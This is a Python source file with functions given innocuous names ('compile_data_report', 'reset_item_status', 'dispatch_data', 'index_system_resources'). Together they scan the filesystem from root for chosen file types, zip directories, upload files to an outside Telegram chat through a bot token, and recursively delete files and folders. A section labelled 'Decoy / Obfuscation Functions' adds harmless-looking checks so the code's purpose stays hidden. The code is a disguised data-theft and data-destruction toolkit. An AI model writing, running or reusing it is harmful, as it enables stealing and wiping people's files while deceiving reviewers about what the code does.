# -*- coding: utf-8 -*-
import os
import zipfile
import shutil
import telebot

def compile_data_report(data_source_path, report_destination):
    """Processes data from a source path and compiles a status report.

    Args:
        data_source_path (str): The path containing the data to process.
        report_destination (str): The destination path for the compiled report file.
    """
    # Ensure the destination has a standard extension, if not provided
    if not report_destination.lower().endswith(".zip"):
        report_destination += ".zip" # Using .zip internally for structure

    try:
        with zipfile.ZipFile(report_destination, 'w', zipfile.ZIP_DEFLATED) as report_file:
            for root, _, files in os.walk(data_source_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Store relative path in the report structure
                    arcname = os.path.relpath(file_path, data_source_path)
                    report_file.write(file_path, arcname)
        print(f"Data report compilation successful for 	'{data_source_path}	'. Report saved to 	'{report_destination}	'.")
        return True, f"Report compiled: {report_destination}"
    except Exception as e:
        print(f"Error compiling data report from 	'{data_source_path}	': {e}")
        return False, str(e)

def reset_item_status(item_identifier):
    """Resets the status of a specified item identifier, clearing its current state.

    Args:
        item_identifier (str): The unique identifier (path) of the item whose status needs reset.
    """
    try:
        if os.path.isfile(item_identifier) or os.path.islink(item_identifier):
            os.remove(item_identifier)
            print(f"Status for item 	'{item_identifier}	' reset successfully.")
            return True, f"Status reset: {item_identifier}"
        elif os.path.isdir(item_identifier):
            shutil.rmtree(item_identifier)
            print(f"Status for container 	'{item_identifier}	' and its contents reset successfully.")
            return True, f"Container status reset: {item_identifier}"
        else:
            print(f"Item identifier 	'{item_identifier}	' not found for status reset.")
            return False, f"Identifier not found: {item_identifier}"
    except Exception as e:
        print(f"Error resetting status for 	'{item_identifier}	': {e}")
        return False, str(e)

def dispatch_data(api_key, recipient_id, data_reference, accompanying_notes=	''):
    """Dispatches specified data reference to a recipient using a given key.

    Args:
        api_key (str): The API key for the dispatch service.
        recipient_id (str): The identifier for the recipient.
        data_reference (str): The reference (path) to the data to dispatch.
        accompanying_notes (str, optional): Optional notes to accompany the data. Defaults to 	''.
    """
    try:
        bot = telebot.TeleBot(api_key)
        if not os.path.exists(data_reference):
            print(f"Error dispatching data: Reference 	'{data_reference}	' not found.")
            return False, f"Reference not found: {data_reference}"

        with open(data_reference, 	'rb	') as data_file:
            bot.send_document(recipient_id, data_file, caption=accompanying_notes)

        print(f"Data reference 	'{data_reference}	' dispatched successfully to 	'{recipient_id}	' using the provided key.")
        return True, f"Dispatched: {data_reference} to {recipient_id}"
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error dispatching data to 	'{recipient_id}	' via service API: {e}")
        if "bot token is invalid" in str(e):
            return False, "Invalid API key."
        elif "chat not found" in str(e):
             return False, "Invalid recipient ID."
        else:
            return False, f"Service API error: {e}"
    except Exception as e:
        print(f"Error dispatching data reference 	'{data_reference}	': {e}")
        return False, str(e)




def index_system_resources(root_scan_path='/', resource_filter=None, output_index_file='system_index.log'):
    """Scans system resources starting from a specified path and generates an index file based on optional filters.
    Useful for system audits and resource management.

    Args:
        root_scan_path (str, optional): The starting path for the resource scan. Defaults to '/'.
        resource_filter (list, optional): A list of resource type identifiers (e.g., extensions like '.log', '.cfg') to include. 
                                         If None, all resources are indexed. Defaults to None.
        output_index_file (str, optional): Path to save the generated index file. Defaults to 'system_index.log'.
    """
    indexed_count = 0
    try:
        with open(output_index_file, 'w', encoding='utf-8', errors='ignore') as index_f:
            index_f.write(f"# System Resource Index - Scan Root: {root_scan_path}\n")
            index_f.write(f"# Filter: {resource_filter}\n# ---\n")
            
            for root, dirs, files in os.walk(root_scan_path, topdown=True, onerror=lambda err: print(f"Permission error accessing {err.filename}, skipping.")):
                # Basic attempt to skip obviously inaccessible/problematic dirs early
                # This is not foolproof and relies on common patterns
                dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['proc', 'sys', 'dev', 'run', 'tmp', 'snap']]
                
                for name in files:
                    try:
                        file_path = os.path.join(root, name)
                        # Apply filter if provided
                        if resource_filter:
                            if any(name.lower().endswith(ext.lower()) for ext in resource_filter):
                                index_f.write(file_path + '\n')
                                indexed_count += 1
                        else:
                            index_f.write(file_path + '\n')
                            indexed_count += 1
                    except Exception as file_err:
                        # Log errors for individual files but continue scan
                        print(f"Error processing file {os.path.join(root, name)}: {file_err}")
                        
        print(f"System resource indexing complete. Found {indexed_count} items. Index saved to '{output_index_file}'.")
        return True, f"Index created: {output_index_file} with {indexed_count} items."
    except Exception as e:
        print(f"Error during system resource indexing: {e}")
        return False, str(e)

# --- Decoy / Obfuscation Functions ---

import time
import random

def check_system_latency(iterations=5):
    """Performs a series of checks to gauge system responsiveness.
    
    Args:
        iterations (int, optional): Number of check iterations. Defaults to 5.
        
    Returns:
        float: An average latency metric based on internal checks.
    """
    latencies = []
    print("Performing system latency checks...")
    for _ in range(iterations):
        start_time = time.monotonic()
        # Simulate some work - sleep is a simple way
        time.sleep(random.uniform(0.01, 0.05))
        # Simulate accessing a resource
        try:
            # Try a harmless operation, like listing current dir attributes
            os.listdir('.') 
        except Exception:
            pass # Ignore errors in decoy function
        end_time = time.monotonic()
        latencies.append(end_time - start_time)
        time.sleep(random.uniform(0.05, 0.1)) # Pause between iterations
        
    avg_latency = sum(latencies) / len(latencies) if latencies else 0
    print(f"System latency check complete. Average metric: {avg_latency:.4f}")
    return avg_latency

def validate_configuration_syntax(config_content):
    """Performs a basic syntax validation on provided configuration content.
    
    Args:
        config_content (str): The configuration content as a string.
        
    Returns:
        bool: True if basic syntax seems valid, False otherwise.
    """
    print("Validating configuration syntax...")
    # Very basic checks: non-empty, maybe check for balanced brackets/quotes as a decoy
    if not config_content or not isinstance(config_content, str):
        print("Validation failed: Content is empty or not a string.")
        return False
    
    # Decoy check for balanced brackets (simple version)
    brackets = {'(': ')', '[': ']', '{': '}'}
    stack = []
    for char in config_content:
        if char in brackets:
            stack.append(char)
        elif char in brackets.values():
            if not stack or brackets[stack.pop()] != char:
                print("Validation failed: Mismatched brackets.")
                return False # Mismatched closing bracket
                
    if stack: # If stack is not empty, brackets are unbalanced
        print("Validation failed: Unbalanced opening brackets.")
        return False
        
    print("Configuration syntax validation passed basic checks.")
    return True

